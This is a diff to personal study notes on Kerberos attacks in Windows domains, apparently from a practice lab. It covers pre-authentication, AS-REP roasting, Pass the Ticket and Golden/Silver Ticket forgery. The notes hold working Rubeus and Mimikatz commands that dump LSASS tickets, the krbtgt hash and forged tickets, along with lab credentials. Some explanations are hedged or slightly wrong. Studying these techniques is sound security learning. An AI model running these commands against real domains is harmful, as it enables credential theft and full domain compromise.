@@ -21,6 +21,8 @@ Kerb is the default auth service for MS Windows domains. It is supposed to be mo
 ---> 2) A TGT. Contains the user's ID, the ID of the TGS, a timestamp, the user's IP and the TGT lifetime, AND the TGS Session key). 
 - The first message is encrypted with the user's secret key (which the user knows) and the TGT is encrypted with the TGS' SECRET KEY
 
+1a) IF Kerberos PRE-AUTH. is enabled, the client will also send a Timestamp which is encrypted with the user's Password Hash as the encryption key. If the KDC reads a valid time when using the user's password hash to decrypt, the KDC knows that this is a legit authentication. Without pre-auth, a malicious actor can send a dummy authenication request, get a TGT in return, and begin cracking it offline. 
+
 3) The client recieves both messages. The client can decrypt the first message of course, because it knows its own password. It decrypts the first message and gets the TGS Session Key. 
 4) The client now creates two messages. One is a plaintext message stating what service the user wants to access. The second message is a "authenticator" which the user's ID/. The second message is encrypted with the TGS Session key.
 5) The client then sends 3 messages to the TGS. 1) The encrypted TGT (2) The authenticator, encrypted with the TGS Session key (3) Plaintext request of the service it wants
@@ -72,3 +74,30 @@ Examples:
 Rubeus.exe kerberost -> Dumps hashes of any roastable users. Must be RUN ON TARGET SYSTEM
 sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.65.72 -request  --> Same shit, but can be done remotely 
 
+4) AS-REP Roasting 
+- This method dumps the krbasrep5 hash of user accounts that have Kerberos pre-authentication disabled.
+
+ Example:
+ Rubeus.exe asreproast -> I think this either must be run local on the DC, or on a Domain-joined system? 
+ 
+5) Pass the Ticket w/ Mimikatz
+- Mimikatz can be used to dump TGTs from LSASS memory. This attack works by dumping the TGT from LSASS memory. Can be used for priv. escl. if you get a domain admin TGT and then use that ticket to impersonate the domain admin. It's basically like re-using/replaying an existing ticket that the domain admin legit used at one point. 
+
+Example:
+- mimikatz.exe -> run Mimikatz exe: 
+- privilege::debug -> Ensure that you're running mimikatz w/ admin priv
+- sekurlsa::tickets /export -> Pull out TGTs from LSASS. This will create a bunch of .kirbi files in whatever directory you're in. The name of the kirbi file lets you know what user that TGT belongs to.
+- kerberos::ptt <ticket> -> This command will cache and impersonate the given ticket. With the TGT ticket loaded in our system, we can start performing actions that may require a TGT, and it'll be used automatically (I think that's how it works. For example, accessing \\IP\adminshare)
+- How to defend? Restrict domain admin from being able to login to anything except the DC. This prevents tickets from being left on low-priv systems. 
+
+6) Golden and Silver Ticket Attacks w/ Mimikatz
+- A "Silver Ticket" is a ticket that grants access to a particular service. A Golden Ticket grants access to any Kerberos service. The former is more discreet is stealth is needed
+- To understand this, need to understand what is KRBTGT. KRBTGT is a service account for the KDC  that issues all of the tickets to clients. If you're able to impersonate this account and create a golden ticket, you efectively give yourself the ability to create service tickets from anything you want. 
+- For Golden Ticket attacks, you're looking to dump the TGT of the krbtgt service account. For a silver ticket, you dump a particular service acct ticket. This will give you the NTLM hash of that account, and that account's unique identifier/sid, and use this to impersonate the account
+
+Examples:
+- lsadump::lsa /inject /name:krbtgt -> Dumps the hash and security identifier needed to create a Golden Ticket. To create a silver ticket, change /name: to smth else like SQLService or w/e service you need access to
+- Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id: -> This creates the Golden Ticket. For a Silver Ticket, you place the NTLM hash of the service account into the /krbtgt slot, the service account's sid into the sid slot, and the ID of 1103. i.e. Kerberos::golden /user:Administrator /domain:controller.local /sid:S-01-223-Aetc. /krbtgt:<HASH> /id:1103
+- misc::cmd -> Opens a new elevated command prompt with the given ticket in mimikatz. 
+
+ 
